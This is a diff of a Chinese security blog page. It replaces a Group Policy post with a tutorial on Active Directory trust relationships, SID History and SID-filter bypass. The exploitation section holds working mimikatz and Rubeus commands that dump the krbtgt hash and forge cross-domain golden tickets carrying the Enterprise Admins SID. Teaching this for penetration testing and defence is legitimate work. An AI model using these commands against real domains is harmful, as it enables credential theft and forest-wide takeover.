@@ -12,7 +12,7 @@
     
     <meta http-equiv="Cache-Control" content="no-siteapp" />
 
-    <title>组策略利用与横向移动 | MYZXCG</title>
+    <title>域信任关系利用与SID 过滤绕过 | MYZXCG</title>
 
     <link rel="stylesheet" href="/css/meme.min.248ffc922f6c9975e8625f71e7ebc1a9e2180e744b9528665612bf7c124dea69.css"/>
 
@@ -27,7 +27,7 @@
         <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
         <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
 
-    <meta name="author" content="myzxcg" /><meta name="description" content="基本介绍 组策略提供对域用户、成员机器、应用程序的集中化管理和配置。 组策略可分为本机组……" />
+    <meta name="author" content="myzxcg" /><meta name="description" content="域信任关系 在Active Directory中提供了多种具有不同用途的信任类型，域信任……" />
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
     <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
@@ -47,22 +47,22 @@
     
 
     
-    <link rel="canonical" href="https://myzxcg.com/2021/09/%E7%BB%84%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" />
+    <link rel="canonical" href="https://myzxcg.com/2022/04/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E5%88%A9%E7%94%A8%E4%B8%8ESID-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/" />
     
 
 <script type="application/ld+json">
     {
         "@context": "https://schema.org",
         "@type": "BlogPosting",
-        "datePublished": "2021-09-05T09:09:39+08:00",
-        "dateModified": "2022-04-06T23:36:52+08:00",
-        "url": "https://myzxcg.com/2021/09/%E7%BB%84%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/",
-        "headline": "组策略利用与横向移动",
-        "description": "基本介绍 组策略提供对域用户、成员机器、应用程序的集中化管理和配置。 组策略可分为本机组……",
+        "datePublished": "2022-04-19T16:03:06+08:00",
+        "dateModified": "2022-04-19T16:16:51+08:00",
+        "url": "https://myzxcg.com/2022/04/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E5%88%A9%E7%94%A8%E4%B8%8ESID-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/",
+        "headline": "域信任关系利用与SID 过滤绕过",
+        "description": "域信任关系 在Active Directory中提供了多种具有不同用途的信任类型，域信任……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  3635 ,
-        "image": ["https://myzxcg.com/images/16492589190575.jpg","https://myzxcg.com/images/image-1630806472.png","https://myzxcg.com/images/image-1630806575.png","https://myzxcg.com/images/16492591286112.jpg","https://myzxcg.com/images/16492591750446.jpg","https://myzxcg.com/images/image-1630806683.png","https://myzxcg.com/images/image-1630807144.png","https://myzxcg.com/images/image-1630807215.png"],
+        "wordCount":  5774 ,
+        "image": ["https://myzxcg.com/images/16503555739430.jpg","https://myzxcg.com/images/16503556644304.jpg","https://myzxcg.com/images/16503556888133.jpg","https://myzxcg.com/images/16503557258003.jpg"],
         "author": {
             "@type": "Person",
             "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
@@ -100,14 +100,14 @@
 
 
 
-<meta property="og:title" content="组策略利用与横向移动" />
-<meta property="og:description" content="基本介绍 组策略提供对域用户、成员机器、应用程序的集中化管理和配置。 组策略可分为本机组……" />
-<meta property="og:url" content="https://myzxcg.com/2021/09/%E7%BB%84%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" />
+<meta property="og:title" content="域信任关系利用与SID 过滤绕过" />
+<meta property="og:description" content="域信任关系 在Active Directory中提供了多种具有不同用途的信任类型，域信任……" />
+<meta property="og:url" content="https://myzxcg.com/2022/04/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E5%88%A9%E7%94%A8%E4%B8%8ESID-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/" />
 <meta property="og:site_name" content="MYZXCG" />
-<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/16492589190575.jpg" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/16503555739430.jpg" />
 <meta property="og:type" content="article" />
-    <meta property="article:published_time" content="2021-09-05T09:09:39&#43;08:00" />
-    <meta property="article:modified_time" content="2022-04-06T23:36:52&#43;08:00" />
+    <meta property="article:published_time" content="2022-04-19T16:03:06&#43;08:00" />
+    <meta property="article:modified_time" content="2022-04-19T16:16:51&#43;08:00" />
     
     <meta property="article:section" content="posts" />
 
@@ -211,7 +211,7 @@
 
         <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
 
-            <h1 class="post-title p-name">组策略利用与横向移动</h1>
+            <h1 class="post-title p-name">域信任关系利用与SID 过滤绕过</h1>
 
             
 
@@ -225,7 +225,7 @@
 <div class="post-meta">
     
         
-        <time datetime="2021-09-05T09:09:39&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.9.5</time>
+        <time datetime="2022-04-19T16:03:06&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.4.19</time>
     
     
     
@@ -239,7 +239,7 @@
     
     
         
-        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;8&nbsp;分钟</span>
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;12&nbsp;分钟</span>
     
 
    
@@ -253,74 +253,185 @@
 
             <nav class="contents">
   <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
-    <li><a id="contents:基本介绍" href="#基本介绍">基本介绍</a></li>
-    <li><a id="contents:gpo-导出与备份" href="#gpo-导出与备份">GPO 导出与备份</a></li>
-    <li><a id="contents:还原组策略中保存的密码" href="#还原组策略中保存的密码">还原组策略中保存的密码</a></li>
-    <li><a id="contents:横向移动" href="#横向移动">横向移动</a></li>
-    <li><a id="contents:权限维持" href="#权限维持">权限维持</a>
+    <li><a id="contents:域信任关系" href="#域信任关系">域信任关系</a>
       <ol>
-        <li><a id="contents:添加用户对gpo的权限" href="#添加用户对gpo的权限">添加用户对GPO的权限</a></li>
-        <li><a id="contents:seenabledelegationprivilege-特权" href="#seenabledelegationprivilege-特权">SeEnableDelegationPrivilege 特权</a></li>
+        <li><a id="contents:查询域信任关系" href="#查询域信任关系">查询域信任关系</a></li>
+        <li><a id="contents:信任域之间的认证过程" href="#信任域之间的认证过程">信任域之间的认证过程</a></li>
+        <li><a id="contents:sid-history" href="#sid-history">SID History</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:利用方法" href="#利用方法">利用方法</a>
+      <ol>
+        <li><a id="contents:krbtgt-密钥创建跨域金票" href="#krbtgt-密钥创建跨域金票">Krbtgt 密钥创建跨域金票</a></li>
+        <li><a id="contents:域信任密钥创建跨域金票" href="#域信任密钥创建跨域金票">域信任密钥创建跨域金票</a></li>
+        <li><a id="contents:无约束委派跨域利用" href="#无约束委派跨域利用">无约束委派跨域利用</a></li>
+        <li><a id="contents:绕过sid-过滤" href="#绕过sid-过滤">绕过SID 过滤</a></li>
       </ol>
     </li>
     <li><a id="contents:参考" href="#参考">参考</a></li>
   </ol>
 </nav><div class="post-body e-content">
-                <h2 id="基本介绍"><a href="#基本介绍" class="anchor-link">#</a><a href="#contents:基本介绍" class="headings">基本介绍</a></h2>
-<blockquote>
-<p>组策略提供对域用户、成员机器、应用程序的集中化管理和配置。</p>
-</blockquote>
-<p>组策略可分为本机组策略和域的组策略：</p>
-<ul>
-<li>本机组策略用于计算机管理员统一管理本机以及所有用户。</li>
-<li>域内的组策略用于域管统一管理域内的所有计算机以及域用户。</li>
-</ul>
-<p>打开组策略管理 <code>gpmc.msc</code></p>
-<ul>
-<li>
-<p><strong>组策略链接</strong></p>
-<p>以Default Domain Policy为例。在右边的作用域里，可以看到它链接到test.local整个域。也就是说在test.local域内的所有计算机、用户都会受到这条组策略的影响。链接的位置可以是域、OU等。</p>
-<p><img src="/images/16492589190575.jpg" alt="">
-注意到图片最下面有一个WMI筛选，此功能是作用于筛选后的指定计算机。比如说作用于所有WIN7的电脑，那么只有WIN7的电脑才会应用此组策略。</p>
-</li>
-<li>
-<p><strong>组策略内容</strong></p>
-<p>打开组策略编辑器，可以看到分为<code>计算机配置</code>以及<code>用户配置</code>，分别作用于计算机和用户。在配置下又分为策略以及首选项。</p>
-<p>首选项是Windows Server 2008发布后用来对GPO中的组策略提供额外的功能。<strong>策略和首选项的不同之处就在于强制性。策略是受管理的、强制实施的。而首选项则是不受管理的、非强制性的。</strong></p>
-<p><img src="/images/image-1630806472.png" alt=""></p>
-</li>
-<li>
-<p><strong>组策略更新</strong></p>
-<p>默认情况下，客户端更新组策略有以下几种方式</p>
+                <h2 id="域信任关系"><a href="#域信任关系" class="anchor-link">#</a><a href="#contents:域信任关系" class="headings">域信任关系</a></h2>
+<p>在Active Directory中提供了多种具有不同用途的信任类型，域信任的作用是解决多域环境中的跨域资源共享问题，也方便对域网络的管理和维护。</p>
+<p><code>Enterprise Admins</code>组的成员对一个林中所有的域具有完全控制权限。</p>
 <ol>
 <li>
-<p>后台轮询检查域控SYSVOL里每条组策略的GPT.ini，如果高于本地保存的组策略版本，客户端将会更新本地的组策略。默认情况下，计算机组策略会在后台每隔 90 分钟（0-30分钟的抖动）更新一次。域控制器上的组策略会每隔 5 分钟更新一次。</p>
+<p><strong>单双向信任关系</strong></p>
+<p>顾名思义，单向就是A域能访问B域资源，反过来却不行；双向是两边都可以互相访问。</p>
+<p>Inbound 表示传入信任，允许当前域可以访问其他域。Outbound 表示传出信任，表示其他域可以访问当前域。信任方向指向的域代表指向的域受当前域信任。</p>
 </li>
 <li>
-<p>用户开机登录时会检查SYSVOL里的GPT.ini。</p>
-</li>
-<li>
-<p>客户端强制更新，执行<code>gpupdate /force</code>。</p>
-<p>域控强制客户端更新<code>Invoke-GPUpdate -Computer &quot;TESTwin10&quot; -Target &quot;User&quot;</code>（不会比较域共享目录中组策略的版本，2008 R2 默认不支持该命令，2012支持）</p>
+<p><strong>传递性与非传递性信任关系</strong></p>
+<p>传递性却决于信任关系是否能够被拓展到创建该信任关系的两个域之外。非传递性的信任关系可以被用来隔绝与其他域的信任关系。</p>
+<p>在域林中创建新的域，默认与父域是双向且传递的信任关系。如果这个新建的域中又创建了一个子域，那么信任路径流会向上拓展到新域和父域之间的信任关系。</p>
 </li>
 </ol>
-<p><strong>组策略应用顺序</strong></p>
-<p>本地组策略 →站点组策略→域组策略→OU组策略。</p>
-<p>如果同一个OU上链接了多个GPO，则按照链接顺序从高到低逐个应用。后应用的组策略覆盖先应用的组策略。</p>
+<hr>
+<ul>
+<li>
+<p><strong>下面根据向域树中或者林根域添加新域情况来分析（自动创建）</strong></p>
+<p>只要有新的域加入到域树中，那么就会创建<strong>父子信任关系</strong>（Parent-Child）。它只能存在于同一颗域树中且一定是双向且传递的信任。可传递性信任关系的双向性使得活动目录中的全局编录信息可以复制到所有层级的的域中。</p>
+<p>当将一个新的域树添加到域林中时，会建立<strong>Tree-Root 信任关系</strong>。活动目录安装向导会自动创建一个双向且传递的信任关系，在同一个域林中的两颗域树根域之间建立。</p>
+<p><img src="/images/16503555739430.jpg" alt=""></p>
 </li>
 <li>
-<p><strong>组策略存储</strong></p>
-<p>组策略存储在域控的两个位置中。一条GPO可以认为就是一条组策略。GPO有唯一ID用来标识每条组策略。</p>
-<p><img src="/images/image-1630806575.png" alt=""></p>
-<p>在 CN=Policies,CN=System,<BaseDn>下，存储了每个GPO的版本信息、GPO 状态和其他组件设置。</p>
-<p><img src="/images/16492591286112.jpg" alt=""></p>
-<p>在 <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies</code>中（域内任何人都可以读取）保存了每条GPO的安全设置，脚本文件等策略数据。GPO 的<code>gPCFileSysPath</code>属性指向了此路径。
-<img src="/images/16492591750446.jpg" alt=""></p>
-<p>在域、OU上的gPLink属性来标识链接的组策略，gPOptions属性用于标识组策略是否会被继承。</p>
-<p><img src="/images/image-1630806683.png" alt=""></p>
+<p>快捷信任关系（Shortcut）、外部信任关系（External）、领域信任关系（Realm）和林信任（Forest）需要手动设置。这些信任关系类型必须使用新建信任关系向导或者Netdom 来创建。</p>
+<ol>
+<li>
+<p><strong>快捷信任关系</strong>指是在同一林中的两个子域间建立直接的信任关系。</p>
+<p>因为在同一个林中域的组织关系是树状结构，从一个子域到另外一个域，需要从树枝的子域顺寻到根域，然后从根域继续顺寻到另外一个子域，而跨域链接相当于在两个子域之间之间建立了一个快捷方式的信任关系，以减少认证和授权的时间和步骤。</p>
+</li>
+<li>
+<p><strong>外部信任关系</strong>指两个不同域林中的域之间的信任关系，此关系是非传递的。如果想要创建一个双向的信任关系，必须手动在每一端设置一个单向的信任关系。</p>
+</li>
+<li>
+<p><strong>林信任关系</strong>指两个域林的林根域通过单个信任关系联系起来以提供跨域认证和授权。林信任关系是不可以扩展到第三个域林中的，也就是没有传递性。</p>
+</li>
+<li>
+<p><strong>领域信任</strong>是为了让AD跟非windows系统的kerberos建立关系而存在的信任。</p>
+</li>
+</ol>
 </li>
 </ul>
-<h2 id="gpo-导出与备份"><a href="#gpo-导出与备份" class="anchor-link">#</a><a href="#contents:gpo-导出与备份" class="headings">GPO 导出与备份</a></h2>
+<h3 id="查询域信任关系"><a href="#查询域信任关系" class="anchor-link">#</a><a href="#contents:查询域信任关系" class="headings">查询域信任关系</a></h3>
+<p>信任关系存放在林根域的全局编录中。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#查询域信任关系</span>
+</span></span><span class="line"><span class="cl"><span class="n">nltest</span> <span class="p">/</span><span class="n">domain_trusts</span>
+</span></span><span class="line"><span class="cl"><span class="c">#查询当前域与test.local域的信任关系</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ADTrust</span> <span class="n">-Identity</span> <span class="n">test</span><span class="p">.</span><span class="n">local</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#获取根域信息，可查看有哪些域</span>
+</span></span><span class="line"><span class="cl"><span class="n">powershell</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Forest]</span><span class="p">::</span><span class="n">GetCurrentForest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="c">#查看当前域信息</span>
+</span></span><span class="line"><span class="cl"><span class="n">powershell</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="c">#查看当前域信任关系</span>
+</span></span><span class="line"><span class="cl"><span class="n">powershell</span> <span class="p">(</span><span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">()).</span><span class="n">GetAllTrustRelationships</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="c">#查看当前域全局编录地址（根域域控地址）</span>
+</span></span><span class="line"><span class="cl"><span class="n">powershell</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Forest]</span><span class="p">::</span><span class="n">GetCurrentForest</span><span class="p">().</span><span class="n">GlobalCatalogs</span>
+</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>用户加入林外部域时，会出现在 <code>CN=ForeignSecurityPrincipals,DC=domain,DC=com</code> 组中。只要枚举 <code>ForeignSecurityPrincipals</code> 组，就可得知哪些用户具有这个外部森林的访问权限。</p>
+<h3 id="信任域之间的认证过程"><a href="#信任域之间的认证过程" class="anchor-link">#</a><a href="#contents:信任域之间的认证过程" class="headings">信任域之间的认证过程</a></h3>
+<p>环境: Jack 在A.com 域（域控为DC1），要访问在B.com 域（域控为DC2） test 机器的cifs服务。（AB 域双向信任）</p>
+<p>使用信任关系时，两个域的域控制器需要共享一个<strong>信任密钥</strong>（Inter-Realm Key，域间密钥）以保证通信安全。当设置域B 到域A 的单向信任时（B信任A），将在域A中创建一个名为B$ 的信任帐户。当域 A 中的用户请求域 B 中的服务票证时，此信任帐户的Hash 用于加密域间 TGT。</p>
+<p>信任关系中的两个域共享的信任密钥（明文存储但包含不可打印字符）存储在双方活动目录的 TDO 中 （Trusted Domain Object）。B 域控制器每三十天更改一次存储在 TDO 中的密码，修改密码后向A 域发起通知要求其设置新密码。B 域的TDO 是<code>CN=A.com,CN=System,DC=B,DC=com</code> ，A 域的TDO 是<code>CN=B.com,CN=System,DC=A,DC=com</code> ，它们存储的密码是相同的。</p>
+<p>在单向信任关系中，信任账户（在User 组以$结尾）只在受信任域中被创建，其密码就是TDO 存储的密码。当双向信任关系被创建时，就会在双方都创建一个信任账户，在全局编录中存档对方域的 SPN、DNS 等信息。</p>
+<p><strong>信任域之间的认证授权过程（下面是简化流程，中间忽略了session key，其实和请求普通服务的Kerberos 流程基本相同）</strong></p>
+<ol>
+<li>Jack 向 DC1 发起请求获取TGT 票据。（SID History 会被添加到PAC 的<code>ExtraSids</code>字段中 ）</li>
+<li>Jack 使用 TGT 票据向 DC1 发起访问 <code>cifs/test.B.com</code> 服务的TGS_REQ 请求。由于服务域名和当前域不同，在TGS 请求中指定<code>NAME_CANONICALIZE</code>字段表明服务可能在其他域中。DC1 在全局编录中查找到请求的服务在B.com 域中，返回使用域信任密钥（<code>B.com$</code>）加密的跨域 TGT（Referral TGT，<strong>此票据中的PAC 完全复制于TGT</strong>）。</li>
+<li>Jack 使用跨域 TGT 向DC2 发起TGS_REQ 请求<code>cifs/test.B.com</code>服务 ，DC2 使用域信任密钥（TDO中）验证跨域  TGT 中的信息，验证成功则修改跨域 TGT中的PAC中的某些字段后，添加到服务票据并返回（服务票据PAC中的<code>ResourceGroup</code> 结构将会包含Jack 用户在B 域中所属的域本地组，表示其在B域中的权限）。</li>
+</ol>
+<h3 id="sid-history"><a href="#sid-history" class="anchor-link">#</a><a href="#contents:sid-history" class="headings">SID History</a></h3>
+<p><strong>基本概念</strong></p>
+<p>每个用户都有SID，而SID 就是用户主体的标识，用于访问资源时进行权限判断。</p>
+<p>SID History 主要用于域迁移。当用户从一个域迁移到另一个域时，会重置该用户的特权创建一个新的SID，并将该用户添加到新的组中。而该用户在旧域中所属组的SID 就存储在用户的SID History属性中。</p>
+<p>当用户想要访问旧域中的资源时，他的历史SID将被添加到其PAC的<code>ExtraSids</code>字段中。旧域通过检查<code>ExtraSids</code>，并授予用户原有的权限，使用户得以访问旧域资源。所以可以通过编辑SID 历史记录，来注入其他域的管理权限。</p>
+<p><em><strong>Tips:</strong></em> <code>ExtraSids</code>字段内容还包含其他域通用组的SID、历史SIDs、其他身份。</p>
+<p><strong>SID 过滤机制</strong></p>
+<p>微软称林是活动目录的安全边界，SID 过滤默认为林信任和外部信任启用，但在林内部禁用。</p>
+<p>仅当迁移的用户需要访问其先前域中的资源时，才需要 SID 历史记录。如果没有用户有此要求，则可以应用 SID 过滤。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#在A域信任B域的情况下，在A域域控上执行，将开启SID过滤，重新启动后生效</span>
+</span></span><span class="line"><span class="cl"><span class="n">netdom</span> <span class="n">trust</span> <span class="p">/</span><span class="n">d:B</span> <span class="n">A</span> <span class="p">/</span><span class="n">Quarantine</span><span class="err">:</span><span class="n">YES</span>
+</span></span><span class="line"><span class="cl"><span class="c">#不加yes会显示状态</span>
+</span></span><span class="line"><span class="cl"><span class="n">netdom</span> <span class="n">trust</span> <span class="p">/</span><span class="n">d:B</span> <span class="n">A</span> <span class="p">/</span><span class="n">Quarantine</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="c">#/EnableSIDhistory:[Yes/No] 参数仅适用于**林信任**。</span>
+</span></span><span class="line"><span class="cl"><span class="n">netdom</span> <span class="n">trust</span> <span class="p">/</span><span class="n">d:B</span> <span class="n">A</span> <span class="p">/</span><span class="n">enablesidhistory</span><span class="err">:</span><span class="n">yes</span>
+</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>不同的信任类型有不同的过滤规则，详情参考 <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280?redirectedfrom=MSDN" target="_blank" rel="noopener">Filtering and Claims Transformation</a></p>
+<p><code>AlwaysFilter、ForestSpecific、EDC、DomainSpecific、NeverFilter</code> 这5种规则包含了会过滤/忽略的SIDs。开启SID 过滤后，这些规则会应用于不同的信任关系（如林信任、林内信任、外部信任等）。</p>
+<p>对于林信任来说，如果A 林信任B 林，那么A 林在生成服务票据的PAC 时，会处理B林发过来的跨域TGT中的PAC，只允许B 林中各个域的所有SID，过滤PAC 中有关 A 林或其他林，甚至未知的SID 。</p>
+<h2 id="利用方法"><a href="#利用方法" class="anchor-link">#</a><a href="#contents:利用方法" class="headings">利用方法</a></h2>
+<p>然而每个域的 SID 都不同，无法知道哪些用户在目标域是管理员权限以及他们的SID。但企业管理组  <code>Enterprise Admins</code> 会被林内的域加入到本域的域管理员组且只存在于根域中，其 SID 为根域的 SID 加上519 。将 <code>Enterprise Admins</code> 的 SID插入到用户 SID历史记录中，则该用户可以在整个林中拥有管理权限。</p>
+<h3 id="krbtgt-密钥创建跨域金票"><a href="#krbtgt-密钥创建跨域金票" class="anchor-link">#</a><a href="#contents:krbtgt-密钥创建跨域金票" class="headings">Krbtgt 密钥创建跨域金票</a></h3>
+<p><em><strong>Tips:</strong></em> 受SID 过滤影响</p>
+<p><code>mimikatz misc::addsid</code> 可以编辑用户的SID History属性。但可以创建一个TGT 后直接将SID History 注入到PAC<code>ExtraSids</code>字段中。</p>
+<p>已控newtree.local域控，获取根域dc01.test.local权限。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#域控上导出krbtgt 用户hash</span>
+</span></span><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;lsadump::lsa /inject /name:krbtgt&#34;</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="c">#mimikatz</span>
+</span></span><span class="line"><span class="cl"><span class="c">#/user 伪造的的域用户 /sids EA组sid /sid 当前域sid /domain当前域 /krbtgt 当前域krbtgt用户</span>
+</span></span><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;kerberos::golden /user:administrator /sids:S-1-5-21-331789915-2083398572-1041350406-519 /sid:S-1-5-21-1380592208-1289200226-379417545 /domain:newtree.local /krbtgt:715c92d8639d13c358be92c632bd9915 /ptt&#34;</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="c">#Rubeus</span>
+</span></span><span class="line"><span class="cl"><span class="c">#/user 伪造子域中的用户名 /id 子域用户的RID /sid 子域sid /group 伪造子域用户所在的组RID /sids 企业管理组SID /aes256 krbtgt用户aes256密钥</span>
+</span></span><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">id</span><span class="err">:</span><span class="n">500</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">newtree</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="err">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1380592208</span><span class="p">-</span><span class="n">1289200226</span><span class="p">-</span><span class="n">379417545</span> <span class="p">/</span><span class="n">groups</span><span class="err">:</span><span class="n">513</span> <span class="p">/</span><span class="n">sids</span><span class="err">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">331789915</span><span class="p">-</span><span class="n">2083398572</span><span class="p">-</span><span class="n">1041350406</span><span class="p">-</span><span class="n">519</span> <span class="p">/</span><span class="n">aes256</span><span class="err">:</span><span class="n">bf9ea5c1659f586dc206ca2b797c9ad19a69df43d2d521234079a27f955cd0a4</span> <span class="p">/</span><span class="n">ptt</span>
+</span></span><span class="line"><span class="cl"><span class="c">#impacket ticketer.py 也可以添加extra SID 到票据中</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">dir </span><span class="p">\\</span><span class="n">dc01</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</span></span></code></pre></td></tr></table></div>
+</div>
